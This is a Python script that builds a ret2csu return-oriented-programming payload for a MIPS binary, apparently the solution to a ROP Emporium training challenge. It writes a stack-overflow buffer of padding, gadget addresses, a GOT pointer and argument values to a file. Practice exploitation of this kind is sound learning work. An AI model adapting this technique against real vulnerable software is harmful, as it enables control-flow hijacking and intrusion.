#!/usr/bin/python3

"""Exploit for ret2csu MIPS."""

import argparse
import pathlib
import struct
import sys

# func and args
A0 = 0xdeadbeef
A1 = 0xcafebabe
A2 = 0xd00df00d
RET2WIN_GOT = 0x00411058

# gadgets
LOAD_SAVED = 0x004009c0
CALL_RET2WIN = 0x004009a0

def main(argv=sys.argv):
    """main."""
    parser = argparse.ArgumentParser(
        description='Exploit for ret2csu MIPS'
    )

    parser.add_argument(
        'payload_file',
        type=pathlib.Path,
        default=pathlib.Path('payload.bin'),
        nargs='?',
        help='Path to write payload file to'
    )

    args = parser.parse_args()

    buf = b'A' * 36
    buf += struct.pack('<I', LOAD_SAVED)
    buf += b'B' * (4 * 7)
    buf += struct.pack('<I', RET2WIN_GOT)
    buf += b'C' * (4 * 2)
    buf += struct.pack('<I', A0)
    buf += struct.pack('<I', A1)
    buf += struct.pack('<I', A2)
    buf += struct.pack('<I', CALL_RET2WIN) 

    with args.payload_file.open(mode='wb') as fobj:
        fobj.write(buf)

    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
